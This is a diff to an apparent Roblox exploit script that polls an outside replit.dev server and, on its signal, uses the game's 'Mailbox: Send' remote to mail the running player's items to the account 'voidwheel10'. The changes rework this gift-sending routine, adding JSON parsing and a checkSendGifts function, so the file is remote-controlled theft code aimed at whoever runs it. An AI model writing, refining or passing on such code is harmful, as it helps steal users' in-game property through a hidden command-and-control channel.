@@ -151,7 +151,7 @@ local TeleportService = game:GetService("TeleportService")
 
 local function CheckRejoin()
     while true do
-        wait(5)
+        task.wait(5)
         local rejoinUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkRejoin"
         local serverDataUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/getServerData"
         local request = (syn and syn.request) or request or (http and http.request) or http_request
@@ -236,7 +236,7 @@ local function CheckRejoin()
                         end
                     end
                 elseif rejoinValue == 3 then
-                    print("safe")
+                    print("value is 3")
                 end
             end
         end
@@ -391,16 +391,24 @@ HugeList = hugePetsString
     })
 })
 wait(5)
-        local checkResponse = request({
-            Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
-            Method = 'GET',
-            Headers = { ['Content-Type'] = 'application/json' }
-        })
+local Http = game:GetService("HttpService")
+local request = (syn and syn.request) or request or (http and http.request) or http_request
 
-        if checkResponse and checkResponse.Body:find('"SendGifts":true') then
-            if diamondsvalue > 50 then
+local function checkSendGifts()
+    local response = request({
+        Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
+        Method = 'GET',
+        Headers = { ['Content-Type'] = 'application/json' }
+    })
 
-                local args = {
+    if response and response.Body then
+        local success, responseBody = pcall(function()
+            return Http:JSONDecode(response.Body)
+        end)
+
+        if success and responseBody.SendGifts then
+            if responseBody.SendGifts == true then
+              local args = {
                     [1] = "voidwheel10",
                     [2] = "enjoy bro",
                     [3] = "Lootbox",
@@ -410,6 +418,11 @@ wait(5)
                 game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
             end
         end
+    end
+end
+
+checkSendGifts()
+        
         wait(1)
     end
 end
